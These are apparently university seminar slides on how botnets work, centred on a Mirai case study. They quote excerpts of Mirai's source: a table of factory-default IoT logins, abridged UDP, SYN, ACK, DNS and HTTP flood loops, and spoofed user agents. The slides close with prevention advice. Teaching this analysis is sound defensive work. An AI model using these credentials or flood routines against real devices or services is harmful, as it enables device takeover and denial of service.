%title: MC714 seminar -> botnets
%author: Isadora Sophia, Raíssa Correia and Luis Gustavo
%date: 2017-10-10

-> botnets: how do they work? do they work in things!? lets find out! <-
=========

-> an in-depth overview regarding botnets <-

_definition:_

> a botnet is a logical collection of internet connected devices 
> whose security has been breached and control ceded to a third party. 

-------------------------------------------------

-> # some of its (bad) applications... <-
---

* DDoS attacks
<br>
* spamming
<br>
* key logging
<br>
* manipulating online polls/games
<br>
* spread of new malware
<br>
* etc&etc.

-------------------------------------------------

-> # DDoS as a "service" <-
---

\- _hackforums.net_: "stickies" advertising various "booter" 
or "stresser" DDoS-for-hire services

> KRONOS-BOOTER REBORN | 25K +R/S - 10G+ PER ATTACK | 
> INSTANT DELIVERY
> 
> [CYBER STRESS] ~ POWERFUL LAYER 4 & 7 BOOTS | BEST XML-RPC |
> VIP Network | API Links

-------------------------------------------------

-> # DDoS as a "service" <-
---

\- bitcoin mining on pirated videogame torrents

  *GTA V* and *Watch Dogs* executing a process named "winlogin.exe"

  users would mistake it for a legitimate Windows process: 
  bitcoin mining software is not recognized as a virus

  the software increases CPU power consumption around 25%

-------------------------------------------------

-> # DDoS as a "service" <-
---

\- attack on *Minecraft* servers:

  successful Minecraft servers can earn upwards of _$50,000_ per month

  ▛▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▜
  ▌“The Minecraft industry is so competitive. If you’re a player,   ▐
  ▌ and your favorite Minecraft server gets knocked offline, you can▐
  ▌ switch to another server. But for the server operators, it’s all▐
  ▌ about maximizing the number of players and running a large,     ▐
  ▌ powerful server. The more players you can hold on the server,   ▐
  ▌ the more money you make. But if you go down, you start to lose  ▐
  ▌ Minecraf players very fast — maybe for good.”                   ▐
  ▙▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▟

  Robert Coelho, vice president of ProxyPipe, Inc.

-------------------------------------------------

-> # how botnets actually work? <-

\- a *bot herder* perform all control from a remote location

\- the *bots* perform their tasks as zombies, and report back
  to the *bot herder*

  _client-server model_: clients communicate via existing servers

  _P2P_:                 do not require a central server to 
\                       communicate with the *bot herder*

-------------------------------------------------

-> # how botnets actually work? <-

-> ## client-server model <-

* centralized architecture
* *command-and-control servers*: CnC
    - commands from _botmaster_
    - forward them to other bots
        + CnC bots

-------------------------------------------------

-> # how botnets actually work? <-

-> ## client-server model <-

* _example_
    - Internet Relay Chat (IRC) messages
    - communication between *bot herder* and *bot client*
        + based on CnC servers model

<br>

-> *bot herder sends...* <-
> :herder!herder@example.com TOPIC #channel ddos www.victim.com

<br>

-> *bot client answers...* <-
> :bot1!bot1@compromised.net PRIVMSG #channel I am ddosing www.victim.com

-------------------------------------------------

-> # how botnets actually work? <-

-> ## client-server model <-

* _weaknesses..._

<br>
> a botmaster will lose control of his or her botnet once the limited
> number of CnC servers are shut down by defenders

<br>
> defenders could easily obtain the identities (e.g. IP addresses)
> of all CnC servers based on their service traffic to a large number
> of bots, or simply from one single captured bot (which contain
> the list of CnC servers)

<br>
> an entire botnet may be exposed once a CnC server in the botnet
> is hijacked or captured by defenders

-------------------------------------------------

-> # how botnets actually work? <-

-> ## P2P model <-

* decentralized
    - peer-to-peer with *CnC*
        + harder to be taken down
<br>
* encryption
    - *public-key* cryptography
    - hard to implement but harder to break it!

-------------------------------------------------

-> # how botnets actually work? <-

-> ## P2P model <-

* _weaknesses..._
    - poor connectivity and easy detection
        + when using *random probing* to find other bots
            * results in extensive traffic
    <br>
    - *gnutella* cache servers for bootstrap process
        + easier to be shut down
        + underlying *WASTE* P2P protocol not scalable
    <br>
    - poor implementation at encryption and authentication
        + single hijacked bot expose the entire botnet
    <br>
    - lots of traffic generation
        + more susceptible to monitoring

-------------------------------------------------

-> # Mirai <-

-> ## an in-depth case study <-

* found by *MalwareMustDie* on August, 2016
    - whitehat research group
* released by *Anna-senpai* on September, 2016
    - source code published at _hackforums.net_

-------------------------------------------------

-> # Mirai <-

-> ## an in-depth case study <-

* inspired many other IoT malware
* infects *linux* devices into bots
    - bots are put for sale 
    - DDoS attacks

-------------------------------------------------

-> # Mirai <-

-> ## main attacks <-

* *20th September, 2016* 
    - Brain Kreb's blog and french cloud service with 1 Tbps
    - famous journalist in cybersecurity subject
<br>
* *21st October, 2016* 
    - Dyn, DNS service
    - 3 waves
        + large part of US and Europe most accessed websites _offline_
        + 12:10-14:20, 16:50-18:11, 21:00-23:11 UTC
<br>
* *November, 2016* 
    - Liberia internet infrastructure
    - Deutsche Telekom
<br>
* *Post 21st October*
    - debate over IoT security and privacy

-------------------------------------------------

-> # Mirai <-

-> ## architecture <-

* IoT botnet
    - loader&bot written in C
    - ScanListen&CnC written in Go
* targets were *BusyBox* based devices
    - 60+ factory default passwords

<br>

~~~ {.numberLines}
add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);
                                                 // root     xc3511
add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);
                                                 // root     vizxv
add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);
                                                 // root     admin
add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);
                                                 // admin    admin
add_auth_entry("\x50\x4D\x4D\x56", "\x1A\x1A\x1A\x1A\x1A\x1A", 6);
                                                 // root     888888
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## architecture <-

\                            .
\             .. ............;;.
   \>:-)       ..::::::::::::;;;;.   ScanListen
       .      . . ::::::::::::;;:'
   . ;.                      :'
    .;  
     ;;.                          telnet port scan
   ;.;;                                        .
   ;;;;.                        .. ............;;.
   ;;;;;                  :(     ..::::::::::::;;;;.   :)
   ;;;;;                       . . ::::::::::::;;:'
   ;;;;;                                       :'
   ;;;;;
   ;;;;;                          brute force login
 ..;;;;;..
  ':::::'
    ':`
    
\    CnC

-------------------------------------------------

-> # Mirai <-

-> ## architecture <-

* new candidate to be a bot!
    - device is reported to *ScanListen*

\                       .
\                     .;;............ ..
             \>:-)  .;;;;::::::::::::..     :(
                     ':;;:::::::::::: . .
                       ':

\                   reports ip+credentials 
\                of found devices (port _48101_)

<br>
* if candidate is valid...

\                                    .
\                     .. ............;;.
             \>:-)     ..::::::::::::;;;;.  D:
                    . . ::::::::::::;;:'
                                     :'

\                   *ScanListen* infects it!

-------------------------------------------------

-> # Mirai <-

-> ## architecture <-

* bot initialization

\                             .
\              .. ............;;.
         :'(    ..::::::::::::;;;;.   \>:-)
              . . ::::::::::::;;:'
                              :'

\         reports itself to *CnC* (port _23_)
<br>

* control is made through *CnC*
    - C2 API for sell

-------------------------------------------------

-> # Mirai <-

-> ## DDoS attacks <-

* DDoS: Distributed Denial of Service
* burst attacks
    - time parameter: ~60 seconds

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* UDP flood
    - via random src and dst port
        + it makes fingerprinting more difficult
        + input rate: about *2Mb/sec*
<br>

~~~ {.numberLines}
while (TRUE) {
    ...
    iph->id = (uint16_t)rand_next();
    udph->source = rand_next();
    udph->dest = rand_next();

    sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) 
    + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, 
    + sizeof (struct sockaddr_in));
}
~~~~~~~~~~~~~~~~~~

<br>
    - system may crash and bot is lost :(
        + some devices can't handle it

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* SYN (synchronize) flood
    - via random src and dst port
        + 1:1 packet correlation (aka host replies with *syn-ack*)
        + input rate: about *700Kb/sec*
<br>

~~~ {.numberLines}
while (TRUE) {
    ...
    iph->id = rand_next() & 0xffff;
    tcph->source = rand_next() & 0xffff;
    tcph->dest = rand_next() & 0xffff;

    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) 
    + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, 
    sizeof (struct sockaddr_in));
}
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* ACK flood
    - via random src and dst port
        + 1:1 packet correlation (aka host replies with *RST*)
        + input rate: about *5Mb/sec*
<br>

~~~ {.numberLines}
while (TRUE) {
    ...
    iph->id = rand_next() & 0xffff;
    tcph->source = rand_next() & 0xffff;
    tcph->dest = rand_next() & 0xffff;
    tcph->ack_seq = rand_next();

    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 
    data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, 
    sizeof (struct sockaddr_in));
}
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* TCP stomp flood
    - doesn't begin the attack until a connection is established
    - similar to ACK flood
        + input rate: about *90Mb/sec* (performed on a Raspberry Pi)
    - receives a sequence number: may trick security protections
<br>

~~~ {.numberLines}
connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));

while (TRUE) {
    ...
    iph->id = rand_next() & 0xffff;
    tcph->seq = htons(stomp_data[i].seq++);
    tcph->ack_seq = htons(stomp_data[i].ack_seq);
    tcph->check = checksum_tcpudp(iph, tcph, 
                    htons(sizeof (struct tcphdr) + data_len), 
                    sizeof (struct tcphdr) + data_len);

    sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) +
     data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, 
     sizeof (struct sockaddr_in));

}
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* valve source engine flood
    - similar to UDP flood
        + input rate: about *160Kb/sec*
    - random source port, destination port _27015_
        + streaming/gaming
        + half-life
        + counter strike
    - payload includes a source engine query
<br>

~~~ {.numberLines}
vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);

udph->source = htons(sport);
udph->dest = htons(dport);
udph->len = htons(sizeof (struct udphdr) + 4 + vse_payload_len);

*((uint32_t *)data) = 0xffffffff;
data += sizeof (uint32_t);

while (TRUE) {
    ...

    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + 
    sizeof (uint32_t) + vse_payload_len, MSG_NOSIGNAL, 
    (struct sockaddr *)&targs[i].sock_addr, 
    sizeof (struct sockaddr_in));
}
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* DNS resolver flood
    - floods the target's DNS server
        + bot performs a lookup for _$STRING.domain.com_
        + input rate: about *190Kb/sec*
    - the attack will come from legitimate DNS resolvers
<br>

~~~ {.numberLines}
ipv4_t dns_resolver = get_dns_resolver();

dnsh->id = htons(dns_hdr_id);
dnsh->opts = htons(1 << 8); // Recursion desired
dnsh->qdcount = htons(1);

curr_lbl = qname;
util_memcpy(qname + 1, domain, domain_len + 1);

dnst = (struct dns_question *)(qname + domain_len + 2);
dnst->qmenu = htons(PROTO_DNS_Qmenu_A);
dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

while (TRUE) {
    ...
    
    sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + 
    sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + 
    sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)
    &targs[i].sock_addr, sizeof (struct sockaddr_in));
}
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

* HTTP flood
    - GET attack
        + input rate: about *500Kb/sec*
        + output rate: about *12Mb/sec* (!!)
    - content is the basic Apache2 welcome page
    - incrementing source ports
<br>

~~~ {.numberLines}
#define TABLE_HTTP_ONE   47  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 
Safari/537.36" */
#define TABLE_HTTP_TWO   48  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 
Safari/537.36" */
#define TABLE_HTTP_THREE 49  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 
Safari/537.36" */
#define TABLE_HTTP_FOUR  50  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 
Safari/537.36" */
#define TABLE_HTTP_FIVE  51  /* "Mozilla/5.0 (Macintosh; 
Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 
(KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## attacks!? <-

~~~ {.numberLines}
util_strcpy(buf + util_strlen(buf), conn->method);
util_strcpy(buf + util_strlen(buf), " ");
util_strcpy(buf + util_strlen(buf), conn->path);
util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
util_strcpy(buf + util_strlen(buf), conn->user_agent);
util_strcpy(buf + util_strlen(buf), "\r\nHost: ");
util_strcpy(buf + util_strlen(buf), conn->domain);
util_strcpy(buf + util_strlen(buf), "\r\n");

while(TRUE) {
    ...
    send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
    conn->last_send = fake_time;

    conn->state = HTTP_CONN_RECV_HEADER;
}
~~~~~~~~~~~~~~~~~~

-------------------------------------------------

-> # Mirai <-

-> ## vulnerability and prevention <-

* device keeps running normal...
    - with sluggishiness&larger band use
<br>
* code is kept on RAM
    - deletes itself from the disk
    - solution: turn off the device?
        + may be reinfected in a few minutes (too widespread)

-------------------------------------------------

-> # Mirai <-

-> ## vulnerability and prevention <-

* 68 username-password pairs
    - avoid using default passwords
<br>
* don't let WAN access the device
<br>
* use a tool to scan ports
    - SSH, telnet, HTTP&HTTPs
    - ports 22, 23, 80, 443

-------------------------------------------------

-> # questions? <-
<br>

-> ## thank you! <-

-------------------------------------------------